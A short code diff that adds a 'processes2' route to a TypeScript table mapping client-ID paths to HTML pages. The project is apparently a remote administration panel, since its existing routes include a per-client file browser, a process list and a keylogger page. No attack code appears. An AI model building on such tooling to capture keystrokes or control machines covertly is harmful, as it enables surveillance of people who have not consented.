@@ -117,6 +117,7 @@ const PATH_CLIENT_PAGES: ClientPageDef[] = [
   { pattern: /^\/(.+)\/files\/classic$/,   file: "filebrowser-classic.html", clientIdGroup: 1 },
   { pattern: /^\/(.+)\/files$/,            file: "filebrowser.html",         clientIdGroup: 1 },
   { pattern: /^\/(.+)\/processes$/,        file: "processes.html",           clientIdGroup: 1 },
+  { pattern: /^\/(.+)\/processes2$/,       file: "processes2.html",          clientIdGroup: 1 },
   { pattern: /^\/(.+)\/keylogger$/,        file: "keylogger.html",           clientIdGroup: 1 },
 ];
 
